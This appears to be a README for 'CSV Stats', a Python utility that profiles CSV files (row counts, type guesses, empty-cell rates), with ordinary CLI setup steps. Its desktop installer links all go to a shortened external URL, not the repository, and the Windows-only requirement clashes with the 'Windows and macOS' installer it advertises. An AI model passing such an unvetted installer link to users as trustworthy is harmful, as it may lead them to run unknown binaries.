![CSV Stats](assets/hero.png)

# CSV Stats

*A quick profile of a dump.*

## Overview

**CSV Stats** is a developer utility. Print row count, column types, and empty-cell rates for a CSV.

Before a join you want shape and nulls, not a BI tool.

Run it in a clone, check the output, then keep or discard the file it wrote.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Row and column counts
- Type guess
- Empty-cell rate
- Optional sample

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/carterbailey-92/csv-stats

MIT license. See `LICENSE`.
